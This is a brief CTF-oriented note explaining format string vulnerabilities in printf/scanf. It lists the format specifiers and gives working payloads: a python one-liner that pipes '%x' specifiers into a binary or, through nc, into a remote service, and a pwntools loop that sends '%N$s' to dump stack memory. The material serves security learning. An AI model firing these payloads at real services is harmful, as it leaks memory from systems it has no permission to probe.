# String Format Vulnerability 
String format vulnerability is a type of vulnerability that occurs when a program uses user input to format a string. This can be used to execute arbitrary code. This is a very common vulnerability and is often used in CTFs.

They are usually caused by the use of the `printf` or `scanf` functions.

The format specifiers are the following:

| Format Specifier | Description |
|---|---|
| %c | Character |
| %d | Signed decimal integer |
| %e | Scientific notation |
| %f | Decimal floating point |
| %g | Use the shortest representation: %e or %f |
| %i | Signed decimal integer |
| %o | Unsigned octal |
| %s | String of characters |
| %u | Unsigned decimal integer |
| %x | Unsigned hexadecimal integer |
| %X | Unsigned hexadecimal integer (uppercase) |

## Print memory address
```bash
$ python -c "print ('%x ' * 64)" | ./<executable> # Local
$ python -c "print ('%x ' * 64)" | nc <ip> <port> # Remote
```

## Bruteforce the stack
```python
from pwn import *

for i in range(1, 100):
    r = remote('host', <port>)
    r.sendline('%' + str(i) + '$s')
    print('%' + str(i) + '$s')
    print(r.recv())
```
